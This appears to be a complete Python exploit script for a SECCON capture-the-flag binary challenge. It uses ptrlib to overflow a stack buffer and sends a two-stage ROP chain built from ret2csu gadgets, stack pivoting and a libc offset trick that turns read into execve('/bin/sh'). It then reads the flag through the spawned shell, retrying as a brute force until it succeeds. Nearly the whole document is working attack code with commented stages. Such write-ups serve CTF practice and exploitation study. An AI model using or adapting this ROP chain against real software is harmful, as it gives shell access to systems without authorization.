from ptrlib import *
import os
import timeout_decorator

@timeout_decorator.timeout(0.5)
def ping():
    sock.sendline("cat flag*")
    return sock.recvline()

libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

rop_pop_rdi = 0x4011c3
rop_pop_rbp = 0x40111d
rop_pop_rsi_r15 = 0x4011c1
rop_pop_rbx_rbp_r12_r13_r14_r15 = 0x004011ba
rop_leave = 0x40115d
rop_add_prax39h_ecx_fsave_prbpm16h_add_rsp_8h_pop_rbx_rbp_r12_r13_r14_r15 = 0x004011b0
rop_add_eax_2EF3h_add_prbpm3Dh_ebx = 0x00401117
rop_add_prbpm3Dh_ebx = 0x0040111c
rop_csu_popper = 0x4011ba
rop_csu_caller = 0x4011a0

got_read = 0x403fe8
addr_writable = 0x404000
addr_target = 0x404073
addr_binsh = 0x404ff8

HOST = os.getenv('SECCON_HOST', 'localhost')
PORT = os.getenv('SECCON_PORT', '9002')

# Just 8-bit brute force :P
while True:
    sock = Socket(HOST, int(PORT))
    #sock = Process("../files/chall")

    """ 1. read 2nd stage + increment eax + stack pivot """
    tail = p64(rop_pop_rbp) + p64(addr_writable) + p64(rop_leave)
    payload  = b'A' * 0x88
    # read 2nd stage payload
    payload += flat([
        rop_csu_popper,
        0, 1, 0, addr_writable, 0x1000, got_read,
        rop_csu_caller,
        0, 0, addr_writable+0x3d, 0, 0, 0, 0,
    ], map=p64)
    # increment eax
    payload += p64(rop_add_eax_2EF3h_add_prbpm3Dh_ebx) * ((0x800 - len(payload) - len(tail)) // 8)
    # pivot
    payload += tail
    assert len(payload) == 0x800
    sock.send(payload)

    """ 2. increment eax + save ecx + make execve + win """
    v = (rop_add_eax_2EF3h_add_prbpm3Dh_ebx << 8) - 0x7ff7 # lucky number
    v = (v ^ 0xffffffff) + 1
    delta = (libc.symbol('read') + 18 - libc.symbol('execve'))
    delta = (delta ^ 0xffffffff) + 1
    payload  = p64(addr_writable+0x3d) # rbp
    # increment eax
    payload += p64(rop_add_eax_2EF3h_add_prbpm3Dh_ebx) * (0x408 // 8)
    payload += flat([
        # change rbp so that fsave won't clear it
        rop_pop_rbp, 0x404100,
        # store ecx
        rop_add_prax39h_ecx_fsave_prbpm16h_add_rsp_8h_pop_rbx_rbp_r12_r13_r14_r15,
        0, v, addr_target+4+0x3d, 0, 0, 0, 0,
        # prepend upper 32-bit
        rop_add_prbpm3Dh_ebx,
        # make system address
        rop_pop_rbx_rbp_r12_r13_r14_r15,
        delta, addr_target+0x3d, 0, 0, 0, 0,
        rop_add_prbpm3Dh_ebx,
        # call execve("/bin/sh", NULL, NULL)
        rop_csu_popper,
        0, 1, addr_binsh, 0, 0, addr_target,
        rop_csu_caller,
    ], map=p64)
    payload += b'A' * (0xff8 - len(payload))
    payload += b'/bin/sh\0'
    assert len(payload) == 0x1000
    sock.send(payload)

    try:
        l = ping()
        if b'Segmentation fault' in l:
            logger.warning("Bad luck")
            sock.close()
            continue
        print(l)
    except:
        logger.warning("Bad luck")
        sock.close()
        continue

    break
